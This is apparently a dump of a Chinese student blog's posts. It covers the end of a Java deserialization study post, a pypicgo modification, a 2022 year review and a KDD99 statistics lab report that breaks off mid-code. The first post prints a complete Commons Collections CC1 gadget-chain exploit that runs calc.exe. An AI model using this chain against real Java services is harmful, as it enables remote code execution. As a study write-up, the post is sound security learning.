pop\n\n前面的**chainedTransformer**的构造是一样的\n\n然后代理这，我们相当于是给**LazyMap**代理了**AnnotationInvocationHandler**，从而得到一个**新的对象**，这个新的对象可以强转其类型\n\n所以我们执行该**新得到的对象**中的方法时就会走到**AnnotationInvocationHandler**的`invoke`方法\n\n而在**AnnotationInvocationHandler**的`readObject`中，for语句就已经执行了`entrySet()`，所以我们也无需绕过后面的if\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa377e7622e1c8bd2d033416103846afbchenghaiwen20230330231413-image-20230327115331239.png\n)\n\n然后**AnnotationInvocationHandler**的反射部分也是基本一样的，只不过需要给它的实例强转成**InvocationHandler**，而不就是**Object**了（代理的构造函数就是这样的\n\n最后的入口还是**AnnotationInvocationHandler**的**readObject**，所以最后再实例化一个对象，放入刚刚构建的代理类即可\n\n所以其实这个链子是有两个**AnnotationInvocationHandler**实例的，而`invoke`方法里的if绕过就是执行的函数是一个无参函数，前面可以看到`memberValues.entrySet()`，正好就是一个无参函数，太巧了\n\n最终的链子\n\n```java\npackage org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.Map;\nimport java.util.HashMap;\n\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        Map<Object, Object> map = new HashMap<>();\n        Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);\n\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n        annotationInvocationHandlerConstructor.setAccessible(true);\n        InvocationHandler i = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);\n//构造代理\n        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, i);\n\n        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, mapProxy);\n        //serialize(o);\n        unserialize(\"ser.bin\");\n    }\n\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n}\n```\n\n最终呈现出来的效果就是报错，但是正常执行了命令\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxc3c6936bf3528d63af41c0d470044c2cchenghaiwen20230330231416-image-20230327120525095.png)\n","tags":["java安全"]},{"title":"记一次奇妙的开发体验","url":"/2023/03/30/记一次奇妙的开发体验/","content":"\n## 前言\n之前换博客的时候提到，很大一原因是因为 **typecho** 上传 **markdown** 的时候，上传图片很很很不方便。换用 **hexo** 之后，其实并没有得到太大改善。后来用上了 **PicGo** 加上 **github** 图床，剪切板的图片可以用快捷键一键上传到 **github** 并且得到图片链接然后改为 **markdown** 格式，确实很好用。但是我记笔记大部分都是本地，很多不发博客的笔记完全没必要这样做，纯属增加劳动量。所以今天想发篇博客的时候看着那几十张图片，一个个拖、改，实在难以下手。于是，我想，能不能把要发的 **markdown** 一键上传图片，并且自动将里面的本地图片链接改成图床的链接呢？于是便有了这篇文章。\n## pypicgo\n这种小量的工具还是python方便，我先想到的是PicGo有没有命令行版本，但并未发现。然后便看到了一个python包，[pypicgo](https://github.com/AnsGoo/PyPicGo)\n试了一下，这就是一个单纯的命令行工具，不能直接python内引用函数\n于是...就只能，尝试改改这个包了\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd89737b111768818bdb57ffb0bb4e0b6chenghaiwen20230330232822-image-20230330223457538.png)\n\n这个 **uploade.py** 名字就已经很明显了，大部分的外层逻辑也都在这\n\n这两个参数就是命令行传参的两个参数，**file** 是图片文件，这里我改成了m\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302340651.png)\n\n```python\nparser.add_argument('-m', '--mdfiles')\n```\n\n大体逻辑其实很简单，就是正则匹配到 **markdown** 文件的本地图片路径并存入一个数组，然后遍历上传这些图片\n\n这里我也就加了两个函数\n\n```python\ndef mdFileFindImg(mdFile):\n    files = []\n    for line in mdFile:\n        if line.find('![') != -1:\n            start = line.find('(')\n            end = line.find(')', start)\n            files.append(line[start+1:end])\n    return files\n\n\n\ndef mdFileChange(mdFile, oldFilepath, newFilepath):\n    if mdFile.find(oldFilepath) != -1:\n        potision = mdFile.find(oldFilepath)\n        start = mdFile.find('![', potision - 30, potision)\n        end  = mdFile.find(')', potision)     \n        mdFile = mdFile.replace(mdFile[start:end + 1], '![](' + newFilepath + ')')\n    return mdFile\n```\n\n第一个用来正则匹配路径，第二个用来将 **本地路径** 改为 **图床路径**\n\n所以很明显，更关键的问题是如何找到这个 **图床路径**，这个结果在运行的时候其实会打印出来，但打印的代码在\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302341976.png)\n\n我没想到什么好的方法能将这个 **message** 传到 **upload.py** 中，之前其实也遇到过这种问题，最后我的解决一般都是序列化成文件，或者直接写入文件，这里我就用了后者的办法\n\n（PS：这里的 **message** ，是所有文件上传完后打印出来，打印的是所有的链接\n\n```\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb4b959368a97541ee99cb9ce55f94e74chenghaiwen20230330220944-image-20230327163612053.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa695cf55618458b21f863dfe8adcfaa9chenghaiwen20230330220948-image-20230322171917611.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd4e8406dd0eaa317d3a413182c18044fchenghaiwen20230330220950-image-20230322172032540.png\n\nhttps://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx584e7aec0dac759ce9ee3d7daa45b930chenghaiwen20230330220952-image-20230322172055370.png\n\n```\n\n比如这样子，所以得清除一下空行，然后每个链接占一行这样子\n\n```python\nimport sys, os\nfrom typing import List\nfrom pypicgo.core.base.plugin import FinallyPlugin\nfrom pypicgo.core.base.result import Result\n\n\nclass TyporaPlugin(FinallyPlugin):\n    name = 'Typora'\n\n    def execute(self, results: List[Result]):\n        urls = []\n        for result in results:\n            if result.status:\n                urls.append(result.remote_url)\n        if len(urls) > 0:\n            message = os.linesep.join(urls)\n            sys.stdout.write(f'Upload Success:{os.linesep}message{os.linesep}')\n            lines = [line for line in message.splitlines() if line.strip()]\n            f =  open('url.txt', 'w')\n            f.write('\\n'.join(lines))\n            f.close()\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202303302341916.png)\n\n然后直接上传 **markdown** 就ok啦\n\n但是有可能图库上传了但是文件还没改，和python有关？如果这样了，就得重新上传一遍\n","tags":["dev"]},{"title":"我的2022","url":"/2022/12/31/我的2022/","content":"\n2022是我进入大学的第一年，这一年里确实发生了太多太多，让我也改变了很多，就随心写点什么来为自己的2022画个句号吧。\n\n以前我对文字是不敏感的，根本不会花时间来总结或记录什么。但是这一年，由于学习方面的原因，需要写大量文字，慢慢的也变得喜欢上了写文字，偶尔写些东西发出来或者记录下来是一种很不错的体验（虽然我根本没什么文笔  =。=）。细细想来，这一年真的有很多事情值得记录，但我也不一定能想起来，想到什么就写什么吧。\n\n---\n\n或许和很多**大学or高中**的独立游戏制作者一样，年初第一件记忆深刻的事情一定是**GlobalGameJam**吧，当时我是一个什么都不懂自学了小半年的纯萌新，好在用unity制作简单的游戏是很容易的，所以我也勉勉强强能自己做一些有意思的游戏\n\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312105157.png)\n>\n> 这是参加**NovaGameJam**，临时组了个小队做的第一个游戏 **Vacuum Path**（由于不是今年发生的，而且关卡设计的也很差，就不说了）\n\n\n\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312108907.png)\n>\n> 这是在**GlobalGameJam**前几天看到一个视频然后突发奇想做的一个小游戏 **Gravity reversal**，这个游戏我觉得是挺有意思的，至少给别人玩，虽然时间短，但是反馈都是正向的。对关卡的设计我也觉得是很有想法的，可惜的是之后电脑重装没能留下这个游戏😭😭。游戏内容就是通过推箱子和改变重力的方向？比如这样：\n>\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312118329.png)\n>\n> 将箱子推入到蓝色的地方固定，门就会开启，而红砖块就是将箱子推上去会有一些收集物出现，在后面的关卡加上了传送门和双箱子，以及部分红砖块的位置设计也十分刁钻。但游戏的特性摆在这，所以就算我想设计一条只有一个办法通过的路径，也几乎都在给别人玩的过程中找到了**非预期**，不过也正是这些非预期才让游戏更有趣一点，而不是向上一个游戏一样纯纯折磨玩家。\n\n\n\n> <iframe src=\"//player.bilibili.com/player.html?aid=593403690&bvid=BV1hq4y1C7sx&cid=490799074&page=1\" allowfullscreen=\"allowfullscreen\" width=\"100%\" height=\"500\" scrolling=\"no\" frameborder=\"0\" sandbox=\"allow-top-navigation allow-same-origin allow-forms allow-scripts\"></iframe>\n> 最后就是这款48小时做的  另一个自己 ，其中的美术素材由一个人提供，然后策划，编程（文案？甚至一丢丢的音效）都是我完成的，在48小时几乎除了吃饭、睡觉就在做bug的经历后，我无意中说出了这样一句话：\n>\n> ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312115634.jpg)\n>\n> 但没想到，这个玩笑话不仅成真了...甚至直到现在我都没用再碰过unity\n>\n> 由于本次的主题是 **duality 二元性**，而我作为一个几乎没怎么想过游戏的程序，自然而然的想到了 **黑与白 对称 正反** 等因素。但由于个人水平有限，只能以推箱子为基础做出来了这个**解密加上一丢丢剧情的游戏**，虽然美术方面很简单，但是黑白的对称也让游戏看起来有点韵味，再加上一丢丢的脑洞，就成了这个简单的游戏。\n\n---\n\n除了这些游戏，在一月份同样有一件难忘的事情，就是疫情。当时全国各地的疫情情况普遍偏好，但还是有一些地方会偶尔爆发疫情，西安就在期末考试与回家这个尴尬的节点爆发了在当时算中规模的疫情。于是在[世界第一拉扯.icu](https://xn--4gqwb298gjkax30f37h.icu/)的拉扯下，变成了**既不能考试，也不能回家，全校在宿舍封禁上大一下课程**的尴尬情景。而我却在当时返乡形势完全不明朗，甚至还有可能就地过年的情况下提前十五天买了一张回武汉的高铁票，这张高铁票一直坚持到了我上车，也没退。现在已经想不起来当时是什么想法了，只知道自己想回家，脱离这个是非之地。\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312142635.jpg)\n\n而且在翻以前记录的时候，发现自己早以在**2022年一月份**，就说出了这个几乎困扰了我整个大二上学期的问题（~~**不愧是西电！**~~\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312142646.jpg)\n\n---\n\n似乎大一下真的没有什么让我特别印象深刻的事情，因为这段时间我完完全全的抛弃了做游戏，为了转进计算机而奋斗（~~不喜欢电信~~），于是这段时间好像也过的很快，对我而言时间线就是**实验班考试前和实验班考试后**。虽然当时花了很多时间在学**ctf**上面，但几乎都是自己一个人瞎学，真正学到的东西太少了。不过这段时间确实是对我这个计算机盲一个很好的经历，以前接触电脑只是单纯的玩游戏，很多方面对我而言都是完完全全的未知，这段一个人**找教程，搭环境，看文档**的经历带给我的或许比有人带着更有用。这段时间，真的让我理解了电脑，在很多方面都太有用了（比如玩minecraft java版和自己装mod以及内网穿透来联机，这些东西基本上都能理解原理，所以做起来也很快）。最终我也有惊无险的进入了实验班（指学的web，但考试的四个web一个都不会，完完全全靠着**搜索引擎**混进了实验班，~~所以ctf的本质是搜索引擎~~）。而在进入实验班之后，我所面对的就是由于准备实验班考试而落下的一堆课内课程，靠着西电的考试周期长，以及考前两周基本上属于无课状态，我勉勉强强的学完了所有内容，成功的没挂科 ：））\n\n大一下的暑假是很充实的😭。整个暑假都是忙家里的事，以及忙里偷闲学一学自己想学的，时间很快就过去了（因为暑假时间也没那么长）。大一下我还是很喜欢拍照的，但到了大二我发现这些明明很平常的事，我却都难以想起去做...\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312203432.jpg)\n\n---\n\n到了大二，西安不断爆发的疫情导致这学期大部分日子的早上，都一定有一个核酸等着你。无论是线上还是线下，对于我这个赖床怪几乎每天都是做完核酸去上课就差不多要迟到了，有些时候就反正都迟到了，所幸吃个早餐再去，更多时候都没能坐在食堂好好享受这美好的早餐时间。随着时间的推移，课内课外以及各种事让我愈发烦躁，做核酸就变成了导火线一样让我每天都以一种极度难受的心情开启这一天。这段时间也几乎让我放弃了学ctf，大概有一个多月可能我几乎没碰ctf，转而去学别的内容，去学那些学了就能感受到我学到了知识的东西。这段时间在身心上都十分煎熬，不过随着时间的推移，期末周来了，我也没那么多时间去处理这些杂乱的情绪，一心在预习学过的内容...可是现实总是很戏剧化的，再加上西安这座离奇的城市和西电的管理，我和大一上一样也和今年大部分大学生，期末考试延迟到下学期，然后可以提前回家上网课。而在复习期末的这段时间里，我向张宁老师诉说了我这段时间的烦恼，她最终以让我能跟着学校的ctf校队L做题解决了我的烦恼。于是我重新拾起了这段学习，我没能想过它以后能带给我什么，或许自己真的从被迫学习它，到喜欢上了学习它，我制作游戏的想法也彻彻底底的结束了。\n\n返乡途中，由于疫情几乎要全面放开了，我在回家路上感染了新冠，在感染的时候其实大部分人还是有一点点**谈阳色变**，身边基本上没有人像我一样。不过几天后，就基本上没有**没阳过的**了，我也不知道放开对于我而言是否是个正面的影响，但至少以后不会出现向上学期一样每天被核酸折磨的日子了。没想到回家途中的落地核酸或许成为了我做的最后一次核酸？\n\n---\n\n虽然这一整年都是坎坎坷坷的，但总体来说还是不算荒废的。未来永远是不确定的，确定的是我一定会继续努力下去。这段旅途已经结束了，比起沉浸在回忆中，我更希望看向未知的未来。\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212312230492.jpg)\n","tags":["life"]},{"title":"概率论实验报告","url":"/2022/12/29/概率论实验报告/","content":"\n## 一、实验名称\n\n处理 **KDD99** 数据集\n\n## 二、实验目的\n\n对 **KDD99** 数据集进行处理，获得统计信息。\n\n## 三、实验内容\n\n1. 对“kddcup.data_10_percent”数据集（with label）进行处理，获得统计信息\n\n2. 对“kddcup.testdata.unlabeled”数据集进行处理，获得统计信息\n\n3. 根据“kddcup.data_10_percent”数据集（with label） 分出不同种类的攻击和正常数据，获得基本的统计信息\n\n4. 利⽤labeled数据集的统计特征，分析unlabeled数据集。假设KDD99的正常数据集服从正态分布，则在置信度为0.9的情况下，请检验unlabeled数据集是否属于正常数据？（提示：首先需要获得一个normal的数据样本集，然后需要排除掉数据集中无关features的影响，之后以处理后的数据集估计KDD99正常数据集的均值和方差，然后利用假设检验，对应的去检验unlabeled数据集的相关性质。）\n\n5. 扩展：尝试使用机器学习分类算法利用labeled的数据集进行训练，在使用对应模型对unlabeled数据集进行分类。\n\n## 四、实验数据及结果分析\n\n**KDD99**一共有42项特征，前41项可分为四大类，第42项为**入侵检测试验类型标识**\n\n### 1.单个 TCP 连接的基本特征(1~9)\n\n| 特征名称       | 描述                                | 类型 |\n| -------------- | ----------------------------------- | ---- |\n| duration       | 连接持续的秒数                      | 连续 |\n| protocol_type  | 协议类型，TCP,UDP,ICMP              | 离散 |\n| service        | 目标主机的网络服务类型，共70种      | 离散 |\n| flag           | 连接正常或错误的状态，共11种        | 离散 |\n| src_bytes      | 从源主机到目标主机的数据字节数      | 连续 |\n| dst_bytes      | 从目标主机到源主机的数据字节数      | 连续 |\n| land           | 若连接来自/送达同一个主机/端口则为1 | 离散 |\n| wrong_fragment | 错误分段的数量                      | 连续 |\n| urgent         | 加急包的个数                        | 连续 |\n\n#### 补充\n\n> **service:**\n>\n> ```\n> 'aol', 'auth', 'bgp', 'courier', 'csnet_ns','ctf', 'daytime', 'discard', 'domain', 'domain_u', 'echo', 'eco_i', 'ecr_i', 'efs', 'exec', 'finger', 'ftp', 'ftp_data','gopher', 'harvest', 'hostnames', 'http', 'http_2784', 'http_443', 'http_8001', 'imap4', 'IRC', 'iso_tsap','klogin', 'kshell', 'ldap', 'link', 'login', 'mtp', 'name', 'netbios_dgm', 'netbios_ns', 'netbios_ssn', 'netstat','nnsp', 'nntp', 'ntp_u', 'other', 'pm_dump', 'pop_2', 'pop_3', 'printer', 'private', 'red_i', 'remote_job', 'rje','shell', 'smtp', 'sql_net', 'ssh', 'sunrpc', 'supdup', 'systat', 'telnet', 'tftp_u', 'tim_i', 'time', 'urh_i', 'urp_i','uucp', 'uucp_path', 'vmnet', 'whois', 'X11', 'Z39_50'\n> ```\n\n>**flag**\n>\n>```\n>'OTH', 'REJ', 'RSTO', 'RSTOS0', 'RSTR', 'S0', 'S1',\n>'S2', 'S3', 'SF', 'SH'\n>```\n\n### 2.TCP连接的内容特征(10~22)\n\n| 特征名称           | 描述                                      | 类型 |\n| ------------------ | ----------------------------------------- | ---- |\n| hot                | 访问敏感文件或目录的次数                  | 连续 |\n| num_failed_logins  | 登陆尝试失败的次数                        | 连续 |\n| logged_in          | 成功登陆则为1，否则为0                    | 离散 |\n| num_compromised    | compromised条件出现的次数                 | 连续 |\n| root_shell         | 获得 **root shell** 则为1，否则为0        | 离散 |\n| su_attempted       | 若出现\"**su root**\"命令则为1，否则为0     | 离散 |\n| num_root           | **root **用户访问次数                     | 连续 |\n| num_file_creations | 文件创建操作的次数                        | 连续 |\n| num_shells         | 使用 **shell** 命令的次数                 | 连续 |\n| num_access_files   | 访问控制文件的次数                        | 连续 |\n| num_outbound_cmds  | 一个 **FTP** 会话中出战连接的次数         | 连续 |\n| is_hot_login       | 登陆是否属于\"**hot**\"列表，是为1，否则为0 | 离散 |\n| is_guest_login     | 若是 **guest** 登陆则为1                  | 离散 |\n\n### 3.两秒内网络流量统计特征(23~31)\n\n| 特征名称           | 描述                                                         | 类型 |\n| ------------------ | ------------------------------------------------------------ | ---- |\n| count              | 与当前连接具有相同的目标主机的连接数                         | 连续 |\n| srv_count          | 与当前连接具有相同服务的连接数                               | 连续 |\n| serror_rate        | 在与当前连接具有相同目标主机的连接中，出现\"**SYN**\"错误的连接的百分比 | 连续 |\n| srv_serror_rate    | 在与当前连接具有相同服务的连接中，出现\"**SYN**\"错误的连接的百分比 | 连续 |\n| rerror_rate        | 在与当前连接具有相同目标主机的连接中，出现\"\"**REJ**\"错误的连接的百分比 | 连续 |\n| srv_rerror_rate    | 在与当前连接具有相同服务的连接中，出现\"**REJ**\"错误的连接的百分比 | 连续 |\n| same_srv_rate      | 在与当前连接具有相同目标主机的连接中，与当前连接具有相同服务的连接的百分比 | 连续 |\n| diff_srv_rate      | 在与当前连接具有相同目标主机的连接中，与当前连接具有不同服务的连接的百分比 | 连续 |\n| srv_diff_host_rate | 在与当前连接具有相同服务的连接中，与当前连接具有不同目标主机的连接的百分比 | 连续 |\n\n### 4.一百个连接中的网络流量统计特征(32~41)\n\n| 特征名称                    | 描述                                                         | 类型 |\n| --------------------------- | ------------------------------------------------------------ | ---- |\n| dst_host_count              | 与当前连接具有相同目标主机的连接数                           | 连续 |\n| dst_host_srv_count          | 与当前连接具有相同目标主机相同服务的连接数                   | 连续 |\n| dst_host_same_srv_rate      | 与当前连接具有相同目标主机相同服务的连接所占的百分比         | 连续 |\n| dst_host_diff_srv_rate      | 与当前连接具有相同目标主机不同服务的连接所占的百分比         | 连续 |\n| dst_host_same_src_port_rate | 与当前连接具有相同目标主机相同源端口的连接所占的百分比       | 连续 |\n| dst_host_srv_diff_host_rate | 与当前连接具有相同目标主机相同服务的连接中，与当前连接具有不同源主机的连接所占的百分比 | 连续 |\n| dst_host_serror_rate        | 与当前连接具有相同目标主机的连接中，出现\"**SYN**\"错误的连接所占的百分比 | 连续 |\n| dst_host_srv_serror_rate    | 与当前连接具有相同目标主机相同服务的连接中，出现\"**SYN**\"错误的连接所占的百分比 | 连续 |\n| dst_host_rerror_rate        | 与当前连接具有相同目标主机的连接中，出现\"**REJ**\"错误的连接所占的百分比 | 连续 |\n| dst_host_srv_rerror_rate    | 与当前连接具有相同目标主机相同服务的连接中，出现\"**REJ**\"错误的连接所占的百分比 | 连续 |\n\n第42项\n\n| 标识类型 | 描述                                 | 具体分类标识                                                 |\n| -------- | ------------------------------------ | ------------------------------------------------------------ |\n| Normal   | 正常记录                             | Normal                                                       |\n| DOS      | 拒绝服务攻击                         | back、land、neptune、pod、smurf、teardrop、apache2、mailbomb、processtable、udpstorm |\n| Probing  | 监视和其他探                         | ipsweep、nmap、portsweep、satan、mscan、saint                |\n| R2L      | 来自远程机器的非法访问               | tp_write、guess_passwd、imap、multihop、phf、spy、warezclient、warezmaster、multihop、named、sendmail、snmpgetattack、worm、xlock、xsnoop |\n| U2R      | 普通用户对本地超级用户特权的非法访问 | buffer_overflow、loadmodule、perl、rootkit、ps、sqlattack、xterm、httptunnel |\n\n### 实验结果\n\n#### **1.对“kddcup.data_10_percent”数据集（with label）进行处理，获得统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n```\n\n展示部分数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291140247.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147335.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291147296.png)\n\n#### **2.对“kddcup.testdata.unlabeled”数据集进行处理，获得统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/kddcup.data.corrected-The full data set\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\ndef plot_label(title, font_size):\n    df_label = df.loc[:, title].value_counts()\n    dict_value = {}\n    for i in df_label.keys():\n        dict_value[i] = df_label[i]\n    plot_pie_optimize(title, dict_value, font_size)\n\n\nplot_label(\"label\", 5)\nplot_label(\"flag\", 6)\nplot_label(\"protocol_type\", 6)\n\n```\n\n展示部分数据\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149430.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149133.png)\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/202212291149235.png)\n\n#### **3.根据“kddcup.data_10_percent”数据集（with label） 分出不同种类的攻击和正常数据，获得基本的统计信息**\n\n```python\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlabels =[\"duration\",\"protocol_type\",\"service\",\"flag\",\"src_bytes\",\"dot_bytes\",\"land\",\"wrong_fragment\",\"urgent\",\"hot\",\"num_failed_logins\",\"logged_in\",\"num_compromised\",\"su_attempted\",\"numroot\",\"num_file_creations\",\"num_shells\",\"num_access_files\",\"num_outbound_cmds\",\"is_hot_login\",\"is_guest_login\",\"count\",\"srv_count\",\"serror_rate\",\"srv_serror_rate\",\"rerror_rate\",\"srv_rerror_rate\",\"same_srv_rate\",\"same_srv_rate\",\"diff_srv_rate\",\"srv_diff_host_rate\",\"dst_host_count\",\"dst_host_srv_count\",\"dst_host_same_srv_rate\",\"dst_host_diff_srv_rate\",\"dst_host_same_src_port_rate\",\"dst_host_srv_diff_host_rate\",\"dst_host_serror_rate\",\"dst_host_srv_serror_rate\",\"dst_host_rerror_rate\",\"dst_host_srv_rerror_rate\",\"label\"]\ndf = pd.read_csv(\"./data/corrected-Test data with corrected labels\")\ndf.columns = labels\n\ndef plot_pie_optimize(title, dict_value: dict, font_size):\n    keys = list(dict_value.keys())\n    values = np.array(list(dict_value.values()))\n    patches, texts = plt.pie(values)\n    labels = ['{} {:1.2f}% ({})'.format(i, j, v) for i, j, v in\n              zip(keys, 100. * values / values.sum(), values)]  # 构造图例数据\n    patches, labels, dummy = zip(*sorted(\n        zip(patches, labels, values), key=lambda x: x[2], reverse=True))\n    plt.legend(patches, labels, loc=\"center\", bbox_to_anchor=(-0.1, 0.5), fontsize=font_size)\n    plt.title(title)\n    plt.tight_layout()\n    plt.savefig(\"./dataimg/{}.png\".format(title), dpi = 600, bbox_inches = 'tight') # 使得到的图片更完整清晰\n\n\nnormal_label = ['normal']\ndos_label = ['back','land','neptune','pod','smurf','teardrop','apache2','mailbomb','processtable','udpstorm']\nprobing_label = ['ipsweep','nmap','portsweep','satan','mscan','saint']\nr2l_label = ['tp_write','guess_passwd','imap','multihop','phf','spy','warezclient','warezmaster','multihop','named','sendmail','snmpgetattack','worm','xlock','xsnoop']\nu2r_label = ['buffer_overflow','loadmodule','perl','rootkit','ps','sqlattack','xterm','httptunnel']\n\nfinal_label = ['Normal','Dos','Probing','R2l','U2r']\nfinal_dict = {\n    \"Normal\": 0,\n    \"Dos\": 0,\n    \"Probing\": 0,\n    \"R2l\": 0,\n    \"U2r\": 0\n}\n\nfor i in normal_label:\n    final_dict[\"Normal\"] += df[df.values == i + '.'].__len__()\n\nfor i in dos_label:\n    final_dict[\"Dos\"] += df[df.values == i + '.'].__len__()\n\nfor i in probing_label:\n    final_dict[\"Probing\"] += df[df.values == i + '.'].__len__()\n\nfor i in r2l_label:\n    final_dict[\"R2l\"] += df[df.values == i + '.'].__len__()\n\nfor i in u2r_label:\n    final_dict[\"U2r\"] += df[df.values == i + '.'].__len__()\n\nplot_pie_optimize(\"Attack data\", final_dict, 